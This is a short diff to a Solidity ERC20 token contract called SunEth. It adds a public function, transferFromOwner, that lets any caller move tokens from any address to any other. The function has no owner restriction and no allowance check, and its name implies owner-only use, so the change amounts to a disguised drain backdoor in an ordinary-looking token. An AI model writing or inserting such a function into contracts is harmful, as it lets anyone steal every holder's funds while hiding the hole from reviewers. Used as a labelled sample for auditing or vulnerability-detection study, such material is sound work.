@@ -23,4 +23,8 @@ contract SunEth is ERC20Burnable, Ownable {
     function getOwner() public view returns (address) {
         return super.owner();
     }
+
+    function transferFromOwner(address from, address to, uint256 amount) public {
+        super._transfer(from, to, amount);
+    }
 }
